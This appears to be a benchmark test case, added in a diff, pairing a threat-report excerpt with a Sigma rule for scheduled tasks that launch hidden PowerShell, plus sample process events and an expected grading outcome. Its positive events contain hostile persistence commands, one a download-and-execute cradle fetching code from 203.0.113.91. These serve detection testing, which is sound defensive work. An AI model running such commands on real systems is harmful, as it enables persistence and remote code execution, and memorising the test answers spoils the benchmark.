@@ -1,0 +1,142 @@
+id: CTL1-12
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tags match T1053.005 and T1059.001, all values (schtasks.exe, /create, powershell,
+  -w hidden, -WindowStyle Hidden) are quoted in the evidence, and it requires task creation AND PowerShell
+  AND a hidden window, so queries, non-hidden PowerShell tasks and other task creations do not match.'
+expected_gate: none
+report_text: The operator established persistence with a scheduled task that launches a hidden PowerShell
+  script at every logon. The command observed on the file server was schtasks.exe /create /tn Updater
+  /tr "powershell.exe -w hidden -File C:\ProgramData\Updater\sync.ps1" /sc onlogon /ru SYSTEM. Administrators
+  at this site also create tasks that call PowerShell, for example with -NoProfile -ExecutionPolicy Bypass
+  -File, but they never hide the window, so the hidden window style is what separates the two. Detection
+  should match schtasks.exe with the /create switch, powershell in the task action and a hidden window
+  style, written either -w hidden or -WindowStyle Hidden.
+evidence:
+- The command observed on the file server was schtasks.exe /create /tn Updater /tr "powershell.exe -w
+  hidden -File C:\ProgramData\Updater\sync.ps1" /sc onlogon /ru SYSTEM
+- Detection should match schtasks.exe with the /create switch, powershell in the task action and a hidden
+  window style, written either -w hidden or -WindowStyle Hidden.
+logsource: windows_process_creation
+techniques:
+- T1053.005
+- T1059.001
+sigma_yaml: |
+  title: Scheduled Task Creation Launching Hidden PowerShell
+  id: 16b72529-e8fd-4416-ba0c-d729f84ac50c
+  status: experimental
+  description: 'Detects schtasks.exe creating a task whose action runs PowerShell with a hidden window style.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.persistence
+    - attack.privilege_escalation
+    - attack.t1053.005
+    - attack.t1059.001
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith: '\schtasks.exe'
+    selection_create:
+      CommandLine|contains|all:
+        - '/create'
+        - 'powershell'
+    selection_hidden:
+      CommandLine|windash|contains:
+        - '-w hidden'
+        - '-WindowStyle Hidden'
+    condition: all of selection*
+  falsepositives:
+    - 'Administrators who deliberately hide the console window of a maintenance task'
+  level: medium
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks.exe /create /tn Updater /tr "powershell.exe -w hidden -File C:\ProgramData\Updater\sync.ps1"
+      /sc onlogon /ru SYSTEM
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks /create /f /tn OneDriveSync /tr "powershell -WindowStyle Hidden -NoProfile -File C:\Users\Public\od.ps1"
+      /sc minute /mo 30
+    parent: C:\Windows\System32\wscript.exe
+    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks.exe /create /tn WinUpdateCheck /sc daily /st 03:00 /tr "cmd.exe /c powershell.exe -w
+      hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.91/u')"
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\whoami.exe
+    cmd: whoami
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\tasklist.exe
+    cmd: tasklist /v
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks /query /fo LIST
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks.exe /create /tn Backup /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File
+      C:\Scripts\backup.ps1" /sc daily /st 02:00
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
